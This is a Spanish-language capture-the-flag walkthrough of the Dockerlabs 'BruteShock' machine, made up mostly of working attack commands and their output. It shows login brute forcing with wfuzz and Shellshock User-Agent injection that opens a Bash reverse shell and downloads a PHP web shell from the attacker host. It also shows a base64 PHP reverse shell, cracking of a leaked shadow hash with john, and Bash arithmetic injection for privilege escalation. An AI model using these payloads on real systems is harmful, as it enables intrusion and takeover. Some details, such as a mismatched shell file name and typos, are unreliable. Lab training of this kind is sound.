
# Writeup Template: Maquina `[ BruteShock ]`

- Tags: #BruteShock #ShellShock #Unshadow
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina BruteShock](https://mega.nz/file/iJ1wXbqZ#I7zD68UwDDbrKlUtGNP93P-lNvSY8MOWFSOtm2HNp5c)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x bruteshock.zip
sudo bash auto_deploy.sh bruteshock.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [403 Forbidden] Apache[2.4.62], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2]
```

Ahora como no tenemos permitido el accesoa ese recurso ya que nos retorna un codigo de estado **403Forbidden** El servidor entiende la solicitud, pero se niega a autorizarla.
Veremos como reacciona la web desde el comando **curl**:
Usamos la cookie que por defecto nos da el navegador:
```bash
curl -siL -X GET -H "Cookie: PHPSESSID=itqe4j2g66v5bchb40lsl3dmuj" http://172.17.0.2
```

Tenemos la respuesta:
```bash
HTTP/1.1 200 OK
Date: Wed, 25 Jun 2025 23:40:16 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1839
Content-Type: text/html; charset=UTF-8
```

Ahora si vuelvo a recargar nos carga un panel de login:
```bash
http://172.17.0.2/
```

### SQLInjection:
Primero probaremos inyeciones **SQL** en este panel de inicio de sesion:
**SQLQueryes** probadas
```bash
'
admin'
admin' or 1=1-- -
admin' or '1'='1-- -
admin\' or '1'='1-- -
'--
admin' AND 1=0-- -
```

Biendo que no es vulnerable a inyecciones **SQL** probraremos un ataque de fuerza bruta:
```bash
wfuzz -c --hl=69 -H "Cookie: PHPSESSID=itqe4j2g66v5bchb40lsl3dmuj" -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -t 200 http://172.17.0.2/
```

Tenemos la posible contrasena del usuario admin:
```bash
000013634:   200        0 L      5 W        119 Ch      "christelle" 
```

Si nos conectamos con estas credenciales tendremos acceso:
```bash
username: amdin
password: christelle
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -c "PHPSESSID=itqe4j2g66v5bchb40lsl3dmuj" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/pruebasUltraSecretas/ -c "PHPSESSID=itqe4j2g66v5bchb40lsl3dmuj" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 1873]
/assets               (Status: 301) [Size: 330] [--> http://172.17.0.2/pruebasUltraSecretas/assets/
/post.php             (Status: 200) [Size: 88]
/helper.php           (Status: 200) [Size: 0]]
```

Primero veficicamos si el archvio principal usa un parametro bajo la consulta **php**
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID=itqe4j2g66v5bchb40lsl3dmuj" -u "http://172.17.0.2/pruebasUltraSecretas/index.php?FUZZ=../../../etc/passwd" --hl=44
```

Como no reporta nada, Procedemos a verificar ahora el siguiente que en la web nos idica lo siguiente:
```bash
User-Agent almacenado en el log.
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que sabemos que es vulnerable a **shellSock** realizaremos un ataque:
- Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.
- La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido
### Ejecucion del Ataque
Para verficar que si es vulnerable nos ponemos en escuhca por el puerto 80
```bash
python3 -m http.server 80
```

Ahora lanzamos una peticion envenenando el **UserAgent**
```bash
# Comandos para explotación
curl -I -sL -X GET http://172.17.0.2/pruebasUltraSecretas/index.php -H 'User-Agent: () { :; }; curl http://172.17.0.1/test'
```

Vemos que hemos recibido una solicitud de la maquina victima a nuestra maquina de atacante:
```bash
172.17.0.2 - - [26/Jun/2025 00:47:55] code 404, message File not found
172.17.0.2 - - [26/Jun/2025 00:47:55] "GET /test HTTP/1.1" 404 -
```
### Intrusion
Ahora nos ponemos en escucha para ganar acceso al target
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
curl -I -sL -X GET http://172.17.0.2/pruebasUltraSecretas/index.php -H "User-Agent: () { :; }; echo; /bin/bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'"
```

**Nota** Aunque logramos ganar acceso, Nos cierran la sesion asi que subiremos un archivo malicioso y nos aprovecharemos para cargar una llamada a nivel de sistema que nos permita ejecutar comandos:
Creamos el archivo: **cmd.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Ahora nos montamos un servidor python por el puerto 80 para que este accesible nuestro archivo malicioso
```bash
python3 -m http.server 80
```

Ahora que esta accesible el archivo realizamos la peticion envenenando de nuevo el **UserAgent** para que cargue nuestro archivo en el servidor:
```bash
curl -I -sL -X GET http://172.17.0.2/pruebasUltraSecretas/index.php -H "User-Agent: () { :; }; curl http://172.17.0.1/cmd.php -o cmd.php"
```

Sabemos que se cargo con exito ya que en nuestro servidor de atacante recibimos una peticion:
```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [26/Jun/2025 01:00:08] "GET /cmd.php HTTP/1.1" 200 -
```

Ahora podemos cargar nuestro archivo:
```bash
http://172.17.0.2/pruebasUltraSecretas/cmd.php
```

Ahora ejecutaremos comandos:
```bash
http://172.17.0.2/pruebasUltraSecretas/cmd.php?cmd=whoami
curl -s -X GET "http://172.17.0.2/pruebasUltraSecretas/cmd.php?cmd=whoami"
```

De ambas maneras vemos el output de nuestro comando ejecutado:
```bash
www-data
```

Ahora para ganar accesso al sistema usaremos una **reverShell** de **php**
```bash
php -r '$sock=fsockopen("172.17.0.1",444);exec("/bin/bash -i <&2 >&3 2>&4");'
```

Antes de lanzar el ataque, la codificaremos en base64
```bash
cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4xNy4wLjEiLDQ0Myk7ZXhlYygic2ggPCYzID4mMyAyPiYzIik7Jw==
```

Ahora si podemos lanzar el ataque para ganar accesso:
Para que funcione tenemos que lanzarla con un **echo**
```bash
http://172.17.0.2/pruebasUltraSecretas/shell.php?cmd=echo%20%27cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4xNy4wLjEiLDQ0Myk7ZXhlYygic2ggPCYzID4mMyAyPiYzIik7Jw==%27%20|%20base64%20-d%20|%20bash
```

**Nota** Para que la **revershell** no se  corrompa, Primero exportamos la **bash** y  **xterm** para que cuando reseteemos quede bien,.

---

## Escalada de Privilegios]`
###### Usuario `[ www-data ]`:
Listando los directorios de **home** tenemos capacidad de atravesar el directorio del usuario: **maci** Pero lo que nos interesa es buscar archivos por usuarios del sistema:
Primero detectamos a los usuarios del sistema:
```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
maci:x:1000:1000::/home/maci:/bin/bash
darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
pepe:x:1002:1002:,,,:/home/pepe:/bin/bash
```

Ahora listamos los archvios del siguiente usuario:
```bash
find / -type f -user darksblack 2>/dev/null
```

Obtenemos el siguiente archivo:
```bash
/var/backups/darksblack/.darksblack.txt
```

Si revisamos su contenido tenemos lo siguiente:
```bash
cat /var/backups/darksblack/.darksblack.txt
```

```bash
darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::
```

Ahora para poder crakear esta password necesitamos obtener a este usuario desde el archivo **/etc/passwd**
```bash
darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
```

Ahora estos dos datos los almacenaremos de la siguiente manera:
**hash**: darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::
**passwd**: darksblack:x:1001:1001:,,,:/home/darksblack:/bin/bash
Una ves que ya tengamos en los archivos en nuestra maquina loca usamos el comando:
**unshadow**: El comando `unshadow` en Linux se usa para combinar el archivo `/etc/passwd` y `/etc/shadow` en un solo archivo que contiene los hashes de las contraseñas junto con los nombres de usuario, **para que John the Ripper pueda usarlos**.
```bash
unshadow passwd hash > data.txt 
```

Ahora lanzamos un ataque de fuerza bruta:
```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt data.txt
```

Tenemos la contrasena:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
salvador1        (darksblack)
```

Migramos a ese usuario:
```bash
su darksblack # ( salvador1 )
```
###### Usuario `[ www-data ]`:
Listando los permisos para este usuario tenemos lo siguinte:
```bash
sudo -l

User darksblack may run the following commands on 84a11267701a:
    (maci) NOPASSWD: /home/maci/script.sh
```

Revisando el contenido del script
```bash
#!/bin/bash

read -rp "Adivina: " num

if [[ $num -eq 123123 ]]
then
  echo "Si"
else
  echo "ERROR"
fi
```

Ahora intentaremos inyectar comandos:
```bash
sudo -u maci /home/maci/script.sh 
```

Ahora inyectamos el comando para migrar al usuario **maci**
```bash
Adivina: a[$(/bin/bash)]+42
```
